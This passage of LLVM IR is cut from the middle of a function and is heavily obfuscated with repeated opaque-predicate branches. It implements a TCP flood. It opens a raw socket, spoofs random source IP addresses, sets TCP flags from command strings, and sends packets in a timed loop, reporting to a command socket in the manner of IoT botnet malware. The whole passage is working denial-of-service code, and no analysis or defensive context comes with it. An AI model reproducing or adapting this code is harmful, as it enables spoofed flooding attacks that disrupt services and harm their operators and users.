  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i8*, i8** %8, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %82 = call i32 @getHost(i8* %80, %struct.in_addr* %81)
  %83 = icmp ne i32 %82, 0
  %84 = load i32, i32* @x.73
  %85 = load i32, i32* @y.74
  %86 = sub i32 %84, 1
  %87 = mul i32 %84, %86
  %88 = urem i32 %87, 2
  %89 = icmp eq i32 %88, 0
  %90 = icmp slt i32 %85, 10
  %91 = or i1 %89, %90
  br i1 %91, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %83, label %92, label %93

; <label>:92:                                     ; preds = %originalBBpart28
  br label %627

; <label>:93:                                     ; preds = %originalBBpart28
  %94 = load i32, i32* @x.73
  %95 = load i32, i32* @y.74
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %93
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %103 = getelementptr inbounds [8 x i8], [8 x i8]* %102, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %103, i8 0, i64 8, i32 4, i1 false)
  %104 = call i32 @socket(i32 2, i32 3, i32 6) #4
  store i32 %104, i32* %17, align 4
  %105 = load i32, i32* %17, align 4
  %106 = icmp ne i32 %105, 0
  %107 = load i32, i32* @x.73
  %108 = load i32, i32* @y.74
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %106, label %134, label %115

; <label>:115:                                    ; preds = %originalBBpart212
  %116 = load i32, i32* @x.73
  %117 = load i32, i32* @y.74
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %115
  %124 = load i32, i32* @mainCommSock, align 4
  %125 = call i32 (i32, i8*, ...) @sockprintf(i32 %124, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.37, i32 0, i32 0))
  %126 = load i32, i32* @x.73
  %127 = load i32, i32* @y.74
  %128 = sub i32 %126, 1
  %129 = mul i32 %126, %128
  %130 = urem i32 %129, 2
  %131 = icmp eq i32 %130, 0
  %132 = icmp slt i32 %127, 10
  %133 = or i1 %131, %132
  br i1 %133, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %627

; <label>:134:                                    ; preds = %originalBBpart212
  store i32 1, i32* %18, align 4
  %135 = load i32, i32* %17, align 4
  %136 = bitcast i32* %18 to i8*
  %137 = call i32 @setsockopt(i32 %135, i32 0, i32 3, i8* %136, i32 4) #4
  %138 = icmp slt i32 %137, 0
  br i1 %138, label %139, label %142

; <label>:139:                                    ; preds = %134
  %140 = load i32, i32* @mainCommSock, align 4
  %141 = call i32 (i32, i8*, ...) @sockprintf(i32 %140, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.38, i32 0, i32 0))
  br label %627

; <label>:142:                                    ; preds = %134
  %143 = load i32, i32* @x.73
  %144 = load i32, i32* @y.74
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %142
  %151 = load i32, i32* %11, align 4
  %152 = icmp eq i32 %151, 0
  %153 = load i32, i32* @x.73
  %154 = load i32, i32* @y.74
  %155 = sub i32 %153, 1
  %156 = mul i32 %153, %155
  %157 = urem i32 %156, 2
  %158 = icmp eq i32 %157, 0
  %159 = icmp slt i32 %154, 10
  %160 = or i1 %158, %159
  br i1 %160, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %152, label %161, label %178

; <label>:161:                                    ; preds = %originalBBpart220
  %162 = load i32, i32* @x.73
  %163 = load i32, i32* @y.74
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %161
  store i32 0, i32* %19, align 4
  %170 = load i32, i32* @x.73
  %171 = load i32, i32* @y.74
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %184

; <label>:178:                                    ; preds = %originalBBpart220
  %179 = load i32, i32* %11, align 4
  %180 = sub nsw i32 32, %179
  %181 = shl i32 1, %180
  %182 = sub nsw i32 %181, 1
  %183 = xor i32 %182, -1
  store i32 %183, i32* %19, align 4
  br label %184

; <label>:184:                                    ; preds = %178, %originalBBpart224
  %185 = load i32, i32* %13, align 4
  %186 = sext i32 %185 to i64
  %187 = add i64 40, %186
  %188 = call i8* @llvm.stacksave()
  store i8* %188, i8** %20, align 8
  %189 = alloca i8, i64 %187, align 16
  %190 = bitcast i8* %189 to %struct.iphdr*
  store %struct.iphdr* %190, %struct.iphdr** %21, align 8
  %191 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = getelementptr i8, i8* %192, i64 20
  %194 = bitcast i8* %193 to %struct.tcphdr*
  store %struct.tcphdr* %194, %struct.tcphdr** %22, align 8
  %195 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %196 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %197 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %196, i32 0, i32 0
  %198 = load i32, i32* %197, align 4
  %199 = load i32, i32* %19, align 4
  %200 = call i32 @getRandomIP(i32 %199)
  %201 = call i32 @htonl(i32 %200) #13
  %202 = load i32, i32* %13, align 4
  %203 = sext i32 %202 to i64
  %204 = add i64 20, %203
  %205 = trunc i64 %204 to i32
  call void @makeIPPacket(%struct.iphdr* %195, i32 %198, i32 %201, i8 zeroext 6, i32 %205)
  %206 = call i32 @rand_cmwc()
  %207 = trunc i32 %206 to i16
  %208 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %209 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %208, i32 0, i32 0
  %210 = bitcast %union.anon.0* %209 to %struct.anon.1*
  %211 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %210, i32 0, i32 0
  store i16 %207, i16* %211, align 4
  %212 = call i32 @rand_cmwc()
  %213 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %214 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %213, i32 0, i32 0
  %215 = bitcast %union.anon.0* %214 to %struct.anon.1*
  %216 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %215, i32 0, i32 2
  store i32 %212, i32* %216, align 4
  %217 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %218 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %217, i32 0, i32 0
  %219 = bitcast %union.anon.0* %218 to %struct.anon.1*
  %220 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %219, i32 0, i32 3
  store i32 0, i32* %220, align 4
  %221 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %222 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %221, i32 0, i32 0
  %223 = bitcast %union.anon.0* %222 to %struct.anon.1*
  %224 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %223, i32 0, i32 4
  %225 = load i16, i16* %224, align 4
  %226 = and i16 %225, -241
  %227 = or i16 %226, 80
  store i16 %227, i16* %224, align 4
  %228 = load i8*, i8** %12, align 8
  %229 = call i32 @strcmp(i8* %228, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i32 0, i32 0)) #10
  %230 = icmp ne i32 %229, 0
  br i1 %230, label %267, label %231

; <label>:231:                                    ; preds = %184
  %232 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %233 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %232, i32 0, i32 0
  %234 = bitcast %union.anon.0* %233 to %struct.anon.1*
  %235 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %234, i32 0, i32 4
  %236 = load i16, i16* %235, align 4
  %237 = and i16 %236, -513
  %238 = or i16 %237, 512
  store i16 %238, i16* %235, align 4
  %239 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %240 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %239, i32 0, i32 0
  %241 = bitcast %union.anon.0* %240 to %struct.anon.1*
  %242 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %241, i32 0, i32 4
  %243 = load i16, i16* %242, align 4
  %244 = and i16 %243, -1025
  %245 = or i16 %244, 1024
  store i16 %245, i16* %242, align 4
  %246 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %247 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %246, i32 0, i32 0
  %248 = bitcast %union.anon.0* %247 to %struct.anon.1*
  %249 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %248, i32 0, i32 4
  %250 = load i16, i16* %249, align 4
  %251 = and i16 %250, -257
  %252 = or i16 %251, 256
  store i16 %252, i16* %249, align 4
  %253 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %254 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %253, i32 0, i32 0
  %255 = bitcast %union.anon.0* %254 to %struct.anon.1*
  %256 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %255, i32 0, i32 4
  %257 = load i16, i16* %256, align 4
  %258 = and i16 %257, -4097
  %259 = or i16 %258, 4096
  store i16 %259, i16* %256, align 4
  %260 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %261 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %260, i32 0, i32 0
  %262 = bitcast %union.anon.0* %261 to %struct.anon.1*
  %263 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %262, i32 0, i32 4
  %264 = load i16, i16* %263, align 4
  %265 = and i16 %264, -2049
  %266 = or i16 %265, 2048
  store i16 %266, i16* %263, align 4
  br label %440

; <label>:267:                                    ; preds = %184
  %268 = load i32, i32* @x.73
  %269 = load i32, i32* @y.74
  %270 = sub i32 %268, 1
  %271 = mul i32 %268, %270
  %272 = urem i32 %271, 2
  %273 = icmp eq i32 %272, 0
  %274 = icmp slt i32 %269, 10
  %275 = or i1 %273, %274
  br i1 %275, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %267
  %276 = load i8*, i8** %12, align 8
  %277 = call i8* @strtok(i8* %276, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %277, i8** %23, align 8
  %278 = load i32, i32* @x.73
  %279 = load i32, i32* @y.74
  %280 = sub i32 %278, 1
  %281 = mul i32 %278, %280
  %282 = urem i32 %281, 2
  %283 = icmp eq i32 %282, 0
  %284 = icmp slt i32 %279, 10
  %285 = or i1 %283, %284
  br i1 %285, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %286

; <label>:286:                                    ; preds = %437, %originalBBpart228
  %287 = load i8*, i8** %23, align 8
  %288 = icmp ne i8* %287, null
  br i1 %288, label %289, label %439

; <label>:289:                                    ; preds = %286
  %290 = load i32, i32* @x.73
  %291 = load i32, i32* @y.74
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %289
  %298 = load i8*, i8** %23, align 8
  %299 = call i32 @strcmp(i8* %298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i32 0, i32 0)) #10
  %300 = icmp ne i32 %299, 0
  %301 = load i32, i32* @x.73
  %302 = load i32, i32* @y.74
  %303 = sub i32 %301, 1
  %304 = mul i32 %301, %303
  %305 = urem i32 %304, 2
  %306 = icmp eq i32 %305, 0
  %307 = icmp slt i32 %302, 10
  %308 = or i1 %306, %307
  br i1 %308, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %300, label %333, label %309

; <label>:309:                                    ; preds = %originalBBpart232
  %310 = load i32, i32* @x.73
  %311 = load i32, i32* @y.74
  %312 = sub i32 %310, 1
  %313 = mul i32 %310, %312
  %314 = urem i32 %313, 2
  %315 = icmp eq i32 %314, 0
  %316 = icmp slt i32 %311, 10
  %317 = or i1 %315, %316
  br i1 %317, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %309
  %318 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %319 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %318, i32 0, i32 0
  %320 = bitcast %union.anon.0* %319 to %struct.anon.1*
  %321 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %320, i32 0, i32 4
  %322 = load i16, i16* %321, align 4
  %323 = and i16 %322, -513
  %324 = or i16 %323, 512
  store i16 %324, i16* %321, align 4
  %325 = load i32, i32* @x.73
  %326 = load i32, i32* @y.74
  %327 = sub i32 %325, 1
  %328 = mul i32 %325, %327
  %329 = urem i32 %328, 2
  %330 = icmp eq i32 %329, 0
  %331 = icmp slt i32 %326, 10
  %332 = or i1 %330, %331
  br i1 %332, label %originalBBpart244, label %originalBB34alteredBB

originalBBpart244:                                ; preds = %originalBB34
  br label %437

; <label>:333:                                    ; preds = %originalBBpart232
  %334 = load i8*, i8** %23, align 8
  %335 = call i32 @strcmp(i8* %334, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i32 0, i32 0)) #10
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %361, label %337

; <label>:337:                                    ; preds = %333
  %338 = load i32, i32* @x.73
  %339 = load i32, i32* @y.74
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %337
  %346 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %347 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %346, i32 0, i32 0
  %348 = bitcast %union.anon.0* %347 to %struct.anon.1*
  %349 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %348, i32 0, i32 4
  %350 = load i16, i16* %349, align 4
  %351 = and i16 %350, -1025
  %352 = or i16 %351, 1024
  store i16 %352, i16* %349, align 4
  %353 = load i32, i32* @x.73
  %354 = load i32, i32* @y.74
  %355 = sub i32 %353, 1
  %356 = mul i32 %353, %355
  %357 = urem i32 %356, 2
  %358 = icmp eq i32 %357, 0
  %359 = icmp slt i32 %354, 10
  %360 = or i1 %358, %359
  br i1 %360, label %originalBBpart262, label %originalBB46alteredBB

originalBBpart262:                                ; preds = %originalBB46
  br label %436

; <label>:361:                                    ; preds = %333
  %362 = load i8*, i8** %23, align 8
  %363 = call i32 @strcmp(i8* %362, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i32 0, i32 0)) #10
  %364 = icmp ne i32 %363, 0
  br i1 %364, label %373, label %365

; <label>:365:                                    ; preds = %361
  %366 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %367 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %366, i32 0, i32 0
  %368 = bitcast %union.anon.0* %367 to %struct.anon.1*
  %369 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %368, i32 0, i32 4
  %370 = load i16, i16* %369, align 4
  %371 = and i16 %370, -257
  %372 = or i16 %371, 256
  store i16 %372, i16* %369, align 4
  br label %419

; <label>:373:                                    ; preds = %361
  %374 = load i32, i32* @x.73
  %375 = load i32, i32* @y.74
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB64, label %originalBB64alteredBB

originalBB64:                                     ; preds = %originalBB64alteredBB, %373
  %382 = load i8*, i8** %23, align 8
  %383 = call i32 @strcmp(i8* %382, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i32 0, i32 0)) #10
  %384 = icmp ne i32 %383, 0
  %385 = load i32, i32* @x.73
  %386 = load i32, i32* @y.74
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBBpart266, label %originalBB64alteredBB

originalBBpart266:                                ; preds = %originalBB64
  br i1 %384, label %401, label %393

; <label>:393:                                    ; preds = %originalBBpart266
  %394 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %395 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %394, i32 0, i32 0
  %396 = bitcast %union.anon.0* %395 to %struct.anon.1*
  %397 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %396, i32 0, i32 4
  %398 = load i16, i16* %397, align 4
  %399 = and i16 %398, -4097
  %400 = or i16 %399, 4096
  store i16 %400, i16* %397, align 4
  br label %418

; <label>:401:                                    ; preds = %originalBBpart266
  %402 = load i8*, i8** %23, align 8
  %403 = call i32 @strcmp(i8* %402, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i32 0, i32 0)) #10
  %404 = icmp ne i32 %403, 0
  br i1 %404, label %413, label %405

; <label>:405:                                    ; preds = %401
  %406 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %407 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %406, i32 0, i32 0
  %408 = bitcast %union.anon.0* %407 to %struct.anon.1*
  %409 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %408, i32 0, i32 4
  %410 = load i16, i16* %409, align 4
  %411 = and i16 %410, -2049
  %412 = or i16 %411, 2048
  store i16 %412, i16* %409, align 4
  br label %417

; <label>:413:                                    ; preds = %401
  %414 = load i32, i32* @mainCommSock, align 4
  %415 = load i8*, i8** %23, align 8
  %416 = call i32 (i32, i8*, ...) @sockprintf(i32 %414, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.49, i32 0, i32 0), i8* %415)
  br label %417

; <label>:417:                                    ; preds = %413, %405
  br label %418

; <label>:418:                                    ; preds = %417, %393
  br label %419

; <label>:419:                                    ; preds = %418, %365
  %420 = load i32, i32* @x.73
  %421 = load i32, i32* @y.74
  %422 = sub i32 %420, 1
  %423 = mul i32 %420, %422
  %424 = urem i32 %423, 2
  %425 = icmp eq i32 %424, 0
  %426 = icmp slt i32 %421, 10
  %427 = or i1 %425, %426
  br i1 %427, label %originalBB68, label %originalBB68alteredBB

originalBB68:                                     ; preds = %originalBB68alteredBB, %419
  %428 = load i32, i32* @x.73
  %429 = load i32, i32* @y.74
  %430 = sub i32 %428, 1
  %431 = mul i32 %428, %430
  %432 = urem i32 %431, 2
  %433 = icmp eq i32 %432, 0
  %434 = icmp slt i32 %429, 10
  %435 = or i1 %433, %434
  br i1 %435, label %originalBBpart270, label %originalBB68alteredBB

originalBBpart270:                                ; preds = %originalBB68
  br label %436

; <label>:436:                                    ; preds = %originalBBpart270, %originalBBpart262
  br label %437

; <label>:437:                                    ; preds = %436, %originalBBpart244
  %438 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i32 0, i32 0)) #4
  store i8* %438, i8** %23, align 8
  br label %286

; <label>:439:                                    ; preds = %286
  br label %440

; <label>:440:                                    ; preds = %439, %231
  %441 = load i32, i32* @x.73
  %442 = load i32, i32* @y.74
  %443 = sub i32 %441, 1
  %444 = mul i32 %441, %443
  %445 = urem i32 %444, 2
  %446 = icmp eq i32 %445, 0
  %447 = icmp slt i32 %442, 10
  %448 = or i1 %446, %447
  br i1 %448, label %originalBB72, label %originalBB72alteredBB

originalBB72:                                     ; preds = %originalBB72alteredBB, %440
  %449 = call i32 @rand_cmwc()
  %450 = trunc i32 %449 to i16
  %451 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %452 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %451, i32 0, i32 0
  %453 = bitcast %union.anon.0* %452 to %struct.anon.1*
  %454 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %453, i32 0, i32 5
  store i16 %450, i16* %454, align 2
  %455 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 0
  %457 = bitcast %union.anon.0* %456 to %struct.anon.1*
  %458 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %457, i32 0, i32 6
  store i16 0, i16* %458, align 4
  %459 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %460 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %459, i32 0, i32 0
  %461 = bitcast %union.anon.0* %460 to %struct.anon.1*
  %462 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %461, i32 0, i32 7
  store i16 0, i16* %462, align 2
  %463 = load i32, i32* %9, align 4
  %464 = icmp eq i32 %463, 0
  %465 = load i32, i32* @x.73
  %466 = load i32, i32* @y.74
  %467 = sub i32 %465, 1
  %468 = mul i32 %465, %467
  %469 = urem i32 %468, 2
  %470 = icmp eq i32 %469, 0
  %471 = icmp slt i32 %466, 10
  %472 = or i1 %470, %471
  br i1 %472, label %originalBBpart274, label %originalBB72alteredBB

originalBBpart274:                                ; preds = %originalBB72
  br i1 %464, label %473, label %475

; <label>:473:                                    ; preds = %originalBBpart274
  %474 = call i32 @rand_cmwc()
  br label %496

; <label>:475:                                    ; preds = %originalBBpart274
  %476 = load i32, i32* @x.73
  %477 = load i32, i32* @y.74
  %478 = sub i32 %476, 1
  %479 = mul i32 %476, %478
  %480 = urem i32 %479, 2
  %481 = icmp eq i32 %480, 0
  %482 = icmp slt i32 %477, 10
  %483 = or i1 %481, %482
  br i1 %483, label %originalBB76, label %originalBB76alteredBB

originalBB76:                                     ; preds = %originalBB76alteredBB, %475
  %484 = load i32, i32* %9, align 4
  %485 = trunc i32 %484 to i16
  %486 = call zeroext i16 @htons(i16 zeroext %485) #13
  %487 = zext i16 %486 to i32
  %488 = load i32, i32* @x.73
  %489 = load i32, i32* @y.74
  %490 = sub i32 %488, 1
  %491 = mul i32 %488, %490
  %492 = urem i32 %491, 2
  %493 = icmp eq i32 %492, 0
  %494 = icmp slt i32 %489, 10
  %495 = or i1 %493, %494
  br i1 %495, label %originalBBpart278, label %originalBB76alteredBB

originalBBpart278:                                ; preds = %originalBB76
  br label %496

; <label>:496:                                    ; preds = %originalBBpart278, %473
  %497 = phi i32 [ %474, %473 ], [ %487, %originalBBpart278 ]
  %498 = trunc i32 %497 to i16
  %499 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %500 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %499, i32 0, i32 0
  %501 = bitcast %union.anon.0* %500 to %struct.anon.1*
  %502 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %501, i32 0, i32 1
  store i16 %498, i16* %502, align 2
  %503 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %504 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %505 = call zeroext i16 @tcpcsum(%struct.iphdr* %503, %struct.tcphdr* %504)
  %506 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %507 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %506, i32 0, i32 0
  %508 = bitcast %union.anon.0* %507 to %struct.anon.1*
  %509 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %508, i32 0, i32 6
  store i16 %505, i16* %509, align 4
  %510 = bitcast i8* %189 to i16*
  %511 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %512 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %511, i32 0, i32 2
  %513 = load i16, i16* %512, align 2
  %514 = zext i16 %513 to i32
  %515 = call zeroext i16 @csum(i16* %510, i32 %514)
  %516 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %517 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %516, i32 0, i32 7
  store i16 %515, i16* %517, align 2
  %518 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %519 = load i32, i32* %10, align 4
  %520 = add nsw i32 %518, %519
  store i32 %520, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %521

; <label>:521:                                    ; preds = %originalBBpart296, %589, %496
  br label %522

; <label>:522:                                    ; preds = %521
  %523 = load i32, i32* %17, align 4
  %524 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %525 = call i64 @sendto(i32 %523, i8* %189, i64 %187, i32 0, %struct.sockaddr* %524, i32 16)
  %526 = load i32, i32* %19, align 4
  %527 = call i32 @getRandomIP(i32 %526)
  %528 = call i32 @htonl(i32 %527) #13
  %529 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %530 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %529, i32 0, i32 8
  store i32 %528, i32* %530, align 4
  %531 = call i32 @rand_cmwc()
  %532 = trunc i32 %531 to i16
  %533 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %534 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %533, i32 0, i32 3
  store i16 %532, i16* %534, align 4
  %535 = call i32 @rand_cmwc()
  %536 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %537 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %536, i32 0, i32 0
  %538 = bitcast %union.anon.0* %537 to %struct.anon.1*
  %539 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %538, i32 0, i32 2
  store i32 %535, i32* %539, align 4
  %540 = call i32 @rand_cmwc()
  %541 = trunc i32 %540 to i16
  %542 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i32 0, i32 0
  %544 = bitcast %union.anon.0* %543 to %struct.anon.1*
  %545 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %544, i32 0, i32 0
  store i16 %541, i16* %545, align 4
  %546 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %547 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %546, i32 0, i32 0
  %548 = bitcast %union.anon.0* %547 to %struct.anon.1*
  %549 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %548, i32 0, i32 6
  store i16 0, i16* %549, align 4
  %550 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %551 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %552 = call zeroext i16 @tcpcsum(%struct.iphdr* %550, %struct.tcphdr* %551)
  %553 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 0
  %555 = bitcast %union.anon.0* %554 to %struct.anon.1*
  %556 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %555, i32 0, i32 6
  store i16 %552, i16* %556, align 4
  %557 = bitcast i8* %189 to i16*
  %558 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %559 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %558, i32 0, i32 2
  %560 = load i16, i16* %559, align 2
  %561 = zext i16 %560 to i32
  %562 = call zeroext i16 @csum(i16* %557, i32 %561)
  %563 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %564 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %563, i32 0, i32 7
  store i16 %562, i16* %564, align 2
  %565 = load i32, i32* %25, align 4
  %566 = load i32, i32* %15, align 4
  %567 = icmp eq i32 %565, %566
  br i1 %567, label %568, label %590

; <label>:568:                                    ; preds = %522
  %569 = load i32, i32* @x.73
  %570 = load i32, i32* @y.74
  %571 = sub i32 %569, 1
  %572 = mul i32 %569, %571
  %573 = urem i32 %572, 2
  %574 = icmp eq i32 %573, 0
  %575 = icmp slt i32 %570, 10
  %576 = or i1 %574, %575
  br i1 %576, label %originalBB80, label %originalBB80alteredBB

originalBB80:                                     ; preds = %originalBB80alteredBB, %568
  %577 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %578 = load i32, i32* %24, align 4
